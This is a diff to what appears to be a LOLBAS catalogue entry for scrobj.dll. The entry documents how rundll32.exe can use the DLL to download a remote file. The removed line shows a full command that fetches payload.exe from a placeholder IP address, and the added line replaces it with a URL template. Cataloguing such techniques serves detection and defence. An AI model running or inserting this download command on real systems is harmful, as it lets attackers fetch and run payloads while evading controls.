@@ -4,8 +4,8 @@ Description: Windows Script Component Runtime
 Author: Eral4m
 Created: 2021-01-07
 Commands:
-  - Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://x.x.x.x/payload.exe
-    Description: Once executed, rundll32.exe will download the file at the URL in the command to %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\<random>\payload[1].exe.
+  - Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
+    Description: Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
     Usecase: Download file from remote location.
     Category: Download
     Privileges: User
